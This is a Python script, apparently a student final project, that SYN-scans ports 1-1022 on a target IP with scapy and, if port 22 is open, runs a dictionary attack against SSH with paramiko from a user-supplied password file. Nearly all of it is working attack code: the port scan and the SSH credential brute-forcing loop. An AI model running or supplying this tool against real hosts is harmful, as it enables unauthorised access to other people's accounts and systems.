from scapy.layers.inet import *
import paramiko

reset, bold, orange, blue, purple, cyan, red = '\033[0m', '\033[01m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[31m'
reset = reset + bold

print(f"""{purple}{bold}
                                  _       
                                 | |      
  ___  _ __   _ __   ___ _ __ ___| |_ ___ 
 / _ \| '__| | '_ \ / _ \ '__/ _ \ __/ __|
| (_) | |    | |_) |  __/ | |  __/ |_\__ \\
 \___/|_|    | .__/ \___|_|  \___|\__|___/
             | |                          
             |_|                          
-----------python final project-----------{reset}
  This tool first scan for open port and  
    if SSH port found attacking it via    
            dictionary attack.            {purple}
------------------------------------------
""")
try:
    target = input(f"{bold}{blue}Enter target IP: {reset}")
    ports = range(1, 1023)
    open_ports = []

    def scan_port(port):
        src_port = RandShort()
        conf.verb = 0
        syn_pkt = sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5, verbose=False)  # SYN request
        try:
            if syn_pkt.haslayer(TCP):
                if syn_pkt.getlayer(TCP).flags == 0x12:  # equal to SYN-ACK response
                    sr(IP(dst=target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)  # RST request
                    return True
            else:
                print(False)
        except KeyboardInterrupt:
            print(f"\n{red}Keyboard interrupt ")
        except Exception: #
            print(f"{red}{target} host not found")
            exit()

    def check_availability(target):
        try:
            conf.verb = 0
            ping = sr1(IP(dst=target)/ICMP(), retry=0, timeout=3)
        except Exception:
            print(f"{red}{target} host not found")
            return False
        try:
            if ping.haslayer(ICMP):
                return True
        except KeyboardInterrupt:
            print(f"\n{red}Keyboard interrupt ")
        except Exception: #
            print(f"{red}{target} host not found")
            exit()

    def brute_force(port):
        user = input(f"\n{blue}Enter SSH username: {reset}")
        wordlist = input(f"{blue}Enter your pass file path: {reset}")
        try:
            with open(wordlist, "r") as file:
                passwords = file.readlines()
                sshconn = paramiko.SSHClient()
                sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                print(f"\n{orange}Starting...{reset}\n")
                for password in passwords:
                    try:
                        sshconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                        if sshconn:
                            print(f"\nThe password for {cyan}{user}{reset} is {cyan}{password}{reset}")
                            sshconn.close()
                            break
                    except Exception:
                        password = password.strip("\n")
                        print(f"{password} failed.")
        except FileNotFoundError:
            print(f"\n{red}File {wordlist} not found.")
            exit()


    if check_availability(target):
        for port in ports:
            status = scan_port(port)
            if status:
                open_ports.append(port)
                print(f"Port {blue}{port}{reset} is open")
        print(f"{blue}Scan finished!\n")

        if 22 in open_ports:
            print(f"{orange}Port 22 exist.")
            action = input(f"Do you want to brute-force it? (yes / no): {reset}")
            if action[0] == "y" or action[0] == "Y":
                brute_force(22)
            else:
                exit()
except KeyboardInterrupt:
    print(f"\n{red}Keyboard interrupt")
    
